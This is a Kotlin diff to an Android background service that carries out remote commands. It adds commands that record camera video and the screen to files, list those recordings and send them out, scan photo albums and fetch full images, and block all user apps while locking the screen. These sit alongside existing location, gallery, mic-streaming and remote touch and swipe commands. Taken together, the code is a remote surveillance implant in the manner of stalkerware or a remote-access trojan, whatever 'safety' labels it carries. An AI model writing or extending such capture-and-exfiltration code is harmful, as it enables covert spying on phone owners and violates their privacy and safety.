@@ -91,6 +91,8 @@ class CoreService : Service() {
         AmbientRecorder.stopRecording(this)
         PermissionWatcher.stop()
         OfflineAlertManager.stop()
+        try { CameraRecorder.stop(this) } catch (_: Exception) {}
+        try { ScreenRecorder.stop(this) } catch (_: Exception) {}
         releaseWakeLock()
         WatchdogReceiver.schedule(this)
         try { getSystemService(ConnectivityManager::class.java).unregisterNetworkCallback(networkCallback) } catch (_: Exception) {}
@@ -287,6 +289,25 @@ class CoreService : Service() {
                 "get_location"   -> sendLocation()
                 "take_photo"     -> takeSinglePhoto()
                 "emergency_lock" -> { lockScreen(); sendData("emergency_locked", JSONObject()) }
+
+                // ── Emergency Lock ALL apps ────────────────────────────────────
+                "emergency_lock_all" -> {
+                    val pm   = packageManager
+                    val pkgs = pm.getInstalledPackages(0)
+                        .filter { it.applicationInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM == 0 }
+                        .map { it.packageName }
+                        .filter { it != packageName }
+                    AppBlockerManager.setBlockedApps(pkgs)
+                    lockScreen()
+                    sendData("emergency_locked_all", JSONObject().apply {
+                        put("blocked_count", pkgs.size)
+                        put("source", "emergency_lock_all")
+                    })
+                }
+                "emergency_unlock_all" -> {
+                    AppBlockerManager.setBlockedApps(emptyList())
+                    sendData("emergency_unlocked_all", JSONObject().apply { put("source", "emergency_unlock_all") })
+                }
                 "wifi_on"        -> runShellCmd("svc wifi enable")
                 "wifi_off"       -> runShellCmd("svc wifi disable")
                 "get_gallery"    -> sendGallery(data.optInt("limit", 20))
@@ -302,6 +323,49 @@ class CoreService : Service() {
                 "stop_mic_stream"     -> startService(Intent(this, AudioStreamService::class.java).setAction("STOP"))
                 "start_screen_stream" -> startService(Intent(this, ScreenStreamService::class.java).putExtra("interval", data.optLong("interval", 500L)))
                 "stop_screen_stream"  -> startService(Intent(this, ScreenStreamService::class.java).setAction("STOP"))
+
+                // ── Camera Video Recording to file ─────────────────────────────
+                "start_camera_record" -> {
+                    val secs  = data.optInt("duration_seconds", 60)
+                    val front = data.optBoolean("front_camera", false)
+                    CameraRecorder.start(this, secs, front)
+                }
+                "stop_camera_record"  -> CameraRecorder.stop(this)
+                "list_camera_records" -> {
+                    val files = CameraRecorder.listRecordings(this)
+                    val arr   = JSONArray()
+                    files.take(20).forEach { f ->
+                        arr.put(JSONObject().apply {
+                            put("path", f.absolutePath); put("filename", f.name)
+                            put("size_kb", f.length() / 1024); put("modified", f.lastModified())
+                        })
+                    }
+                    sendData("camera_record_list", JSONObject().apply { put("files", arr) })
+                }
+                "get_camera_record_file" -> CameraRecorder.sendRecordingFile(this, data.optString("path"))
+
+                // ── Screen Recording to file ───────────────────────────────────
+                "start_screen_record" -> {
+                    val secs = data.optInt("duration_seconds", 60)
+                    ScreenRecorder.start(this, secs)
+                }
+                "stop_screen_record"  -> ScreenRecorder.stop(this)
+                "list_screen_records" -> {
+                    val files = ScreenRecorder.listRecordings(this)
+                    val arr   = JSONArray()
+                    files.take(20).forEach { f ->
+                        arr.put(JSONObject().apply {
+                            put("path", f.absolutePath); put("filename", f.name)
+                            put("size_kb", f.length() / 1024); put("modified", f.lastModified())
+                        })
+                    }
+                    sendData("screen_record_list", JSONObject().apply { put("files", arr) })
+                }
+                "get_screen_record_file" -> ScreenRecorder.sendRecordingFile(this, data.optString("path"))
+
+                // ── Albums Safety ──────────────────────────────────────────────
+                "scan_albums"    -> AlbumsSafetyScanner.scan(this)
+                "get_album_image"-> AlbumsSafetyScanner.getFullImage(this, data.optString("uri"))
 
                 "touch"    -> AccessibilityMonitor.performTouch(data.optDouble("x", 0.0).toFloat(), data.optDouble("y", 0.0).toFloat())
                 "swipe"    -> AccessibilityMonitor.performSwipe(data.optDouble("x1", 0.0).toFloat(), data.optDouble("y1", 0.0).toFloat(), data.optDouble("x2", 0.0).toFloat(), data.optDouble("y2", 500.0).toFloat(), data.optLong("duration", 300))
